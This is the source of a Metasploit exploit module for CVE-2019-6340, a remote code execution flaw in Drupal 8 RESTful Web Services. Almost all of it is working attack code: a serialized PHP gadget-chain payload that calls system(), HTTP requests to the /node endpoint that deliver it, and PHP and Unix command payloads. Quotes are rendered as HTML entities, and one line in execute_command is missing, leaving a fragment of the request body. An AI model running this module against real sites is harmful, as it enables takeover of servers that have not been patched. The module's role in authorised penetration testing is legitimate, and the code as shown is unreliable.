# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  # NOTE: All (four) Web Services modules need to be enabled
  Rank = NormalRanking

  include Msf::Exploit::Remote::HTTP::Drupal

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;               => &#039;Drupal RESTful Web Services unserialize() RCE&#039;,
      &#039;Description&#039;        => %q{
        This module exploits a PHP unserialize() vulnerability in Drupal RESTful
        Web Services by sending a crafted request to the /node REST endpoint.

        As per SA-CORE-2019-003, the initial remediation was to disable POST,
        PATCH, and PUT, but Ambionics discovered that GET was also vulnerable
        (albeit cached). Cached nodes can be exploited only once.

        Drupal updated SA-CORE-2019-003 with PSA-2019-02-22 to notify users of
        this alternate vector.

        Drupal < 8.5.11 and < 8.6.10 are vulnerable.
      },
      &#039;Author&#039;             => [
        &#039;Jasper Mattsson&#039;, # Discovery
        &#039;Charles Fol&#039;,     # PoC
        &#039;Rotem Reiss&#039;,     # Module
        &#039;wvu&#039;              # Module
      ],
      &#039;References&#039;         => [
        [&#039;CVE&#039;, &#039;2019-6340&#039;],
        [&#039;URL&#039;, &#039;https://www.drupal.org/sa-core-2019-003&#039;],
        [&#039;URL&#039;, &#039;https://www.drupal.org/psa-2019-02-22&#039;],
        [&#039;URL&#039;, &#039;https://www.ambionics.io/blog/drupal8-rce&#039;],
        [&#039;URL&#039;, &#039;https://github.com/ambionics/phpggc&#039;],
        [&#039;URL&#039;, &#039;https://twitter.com/jcran/status/1099206271901798400&#039;]
      ],
      &#039;DisclosureDate&#039;     => &#039;2019-02-20&#039;,
      &#039;License&#039;            => MSF_LICENSE,
      &#039;Platform&#039;           => [&#039;php&#039;, &#039;unix&#039;],
      &#039;Arch&#039;               => [ARCH_PHP, ARCH_CMD],
      &#039;Privileged&#039;         => false,
      &#039;Targets&#039;            => [
        [&#039;PHP In-Memory&#039;,
          &#039;Platform&#039;       => &#039;php&#039;,
          &#039;Arch&#039;           => ARCH_PHP,
          &#039;Type&#039;           => :php_memory,
          &#039;Payload&#039;        => {&#039;BadChars&#039; => "&#039;"},
          &#039;DefaultOptions&#039; => {
          }
        ],
        [&#039;Unix In-Memory&#039;,
          &#039;Platform&#039;       => &#039;unix&#039;,
          &#039;Arch&#039;           => ARCH_CMD,
          &#039;Type&#039;           => :unix_memory,
          &#039;DefaultOptions&#039; => {
            &#039;PAYLOAD&#039;      => &#039;cmd/unix/generic&#039;,
            &#039;CMD&#039;          => &#039;id&#039;
          }
        ]
      ],
      &#039;DefaultTarget&#039;      => 0,
      &#039;Notes&#039;              => {
        &#039;Stability&#039;        => [CRASH_SAFE],
        &#039;SideEffects&#039;      => [IOC_IN_LOGS],
        &#039;Reliablity&#039;       => [UNRELIABLE_SESSION], # When using the GET method
        &#039;AKA&#039;              => [&#039;SA-CORE-2019-003&#039;]
      }
    ))

    register_options([
      OptEnum.new(&#039;METHOD&#039;, [true, &#039;HTTP method to use&#039;, &#039;POST&#039;,
                            [&#039;GET&#039;, &#039;POST&#039;, &#039;PATCH&#039;, &#039;PUT&#039;]]),
      OptInt.new(&#039;NODE&#039;,    [false, &#039;Node ID to target with GET method&#039;, 1])
    ])

    register_advanced_options([
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false])
    ])
  end

  def check
    checkcode = CheckCode::Unknown

    version = drupal_version

    unless version
      vprint_error(&#039;Could not determine Drupal version&#039;)
      return checkcode
    end

    if version.to_s !~ /^8\b/
      vprint_error("Drupal #{version} is not supported")
      return CheckCode::Safe
    end

    vprint_status("Drupal #{version} targeted at #{full_uri}")
    checkcode = CheckCode::Detected

    changelog = drupal_changelog(version)

    unless changelog
      vprint_error(&#039;Could not determine Drupal patch level&#039;)
      return checkcode
    end

    case drupal_patch(changelog, &#039;SA-CORE-2019-003&#039;)
    when nil
      vprint_warning(&#039;CHANGELOG.txt no longer contains patch level&#039;)
    when true
      vprint_warning(&#039;Drupal appears patched in CHANGELOG.txt&#039;)
      checkcode = CheckCode::Safe
    when false
      vprint_good(&#039;Drupal appears unpatched in CHANGELOG.txt&#039;)
      checkcode = CheckCode::Appears
    end

    # Any further with GET and we risk caching the targeted node
    return checkcode if meth == &#039;GET&#039;

    # NOTE: Exploiting the vuln will move us from "Safe" to Vulnerable
    token = Rex::Text.rand_text_alphanumeric(8..42)
    res   = execute_command("echo #{token}")

    return checkcode unless res

    if res.body.include?(token)
      vprint_good(&#039;Drupal is vulnerable to code execution&#039;)
      checkcode = CheckCode::Vulnerable
    end

    checkcode
  end

  def exploit
    if [CheckCode::Safe, CheckCode::Unknown].include?(check)
      if datastore[&#039;ForceExploit&#039;]
        print_warning(&#039;ForceExploit set! Exploiting anyway!&#039;)
      else
        fail_with(Failure::NotVulnerable, &#039;Set ForceExploit to override&#039;)
      end
    end

    if datastore[&#039;PAYLOAD&#039;] == &#039;cmd/unix/generic&#039;
      print_warning(&#039;Enabling DUMP_OUTPUT for cmd/unix/generic&#039;)
      # XXX: Naughty datastore modification
      datastore[&#039;DUMP_OUTPUT&#039;] = true
    end

    case target[&#039;Type&#039;]
    when :php_memory
      # XXX: This will spawn a *very* obvious process
      execute_command("php -r &#039;#{payload.encoded}&#039;")
    when :unix_memory
      execute_command(payload.encoded)
    end
  end

  def execute_command(cmd, opts = {})
    vprint_status("Executing with system(): #{cmd}")

    # https://en.wikipedia.org/wiki/Hypertext_Application_Language
      &#039;link&#039;      => [
        &#039;value&#039;   => &#039;link&#039;,
        &#039;options&#039; => phpggc_payload(cmd)
      ],
      &#039;_links&#039;    => {
        &#039;type&#039;    => {
          &#039;href&#039;  => vhost_uri
        }
      }
    )

    print_status("Sending #{meth} to #{node_uri} with link #{vhost_uri}")

    res = send_request_cgi({
      &#039;method&#039;   => meth,
      &#039;uri&#039;      => node_uri,
      &#039;ctype&#039;    => &#039;application/hal+json&#039;,
      &#039;vars_get&#039; => {&#039;_format&#039; => &#039;hal_json&#039;},
      &#039;data&#039;     => hal_json
    }, 3.5)

    return unless res

    case res.code
    # 401 isn&#039;t actually a failure when using the POST method
    when 200, 401
      print_line(res.body) if datastore[&#039;DUMP_OUTPUT&#039;]
      if meth == &#039;GET&#039;
        print_warning(&#039;If you did not get code execution, try a new node ID&#039;)
      end
    when 404
      print_error("#{node_uri} not found")
    when 405
      print_error("#{meth} method not allowed")
    when 422
      print_error(&#039;VHOST may need to be set&#039;)
    when 406
      print_error(&#039;Web Services may not be enabled&#039;)
    else
      print_error("Unexpected reply: #{res.inspect}")
    end

    res
  end

  # phpggc Guzzle/RCE1 system id
  def phpggc_payload(cmd)
    (
      # http://www.phpinternalsbook.com/classes_objects/serialization.html
      <<~EOF
        O:24:"GuzzleHttp\\Psr7\\FnStream":2:{
          s:33:"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods";a:1:{
            s:5:"close";a:2:{
              i:0;O:23:"GuzzleHttp\\HandlerStack":3:{
                s:32:"\u0000GuzzleHttp\\HandlerStack\u0000handler";
                  s:cmd_len:"cmd";
                s:30:"\u0000GuzzleHttp\\HandlerStack\u0000stack";
                  a:1:{i:0;a:1:{i:0;s:6:"system";}}
                s:31:"\u0000GuzzleHttp\\HandlerStack\u0000cached";
                  b:0;
              }
              i:1;s:7:"resolve";
            }
          }
          s:9:"_fn_close";a:2:{
            i:0;r:4;
            i:1;s:7:"resolve";
          }
        }
      EOF
    ).gsub(/\s+/, &#039;&#039;).gsub(&#039;cmd_len&#039;, cmd.length.to_s).gsub(&#039;cmd&#039;, cmd)
  end

  def meth
    datastore[&#039;METHOD&#039;] || &#039;POST&#039;
  end

  def node
    datastore[&#039;NODE&#039;] || 1
  end

  def node_uri
    if meth == &#039;GET&#039;
      normalize_uri(target_uri.path, &#039;/node&#039;, node)
    else
      normalize_uri(target_uri.path, &#039;/node&#039;)
    end
  end

  def vhost_uri
    full_uri(
      normalize_uri(target_uri.path, &#039;/rest/type/shortcut/default&#039;),
      vhost_uri: true
    )
  end

end

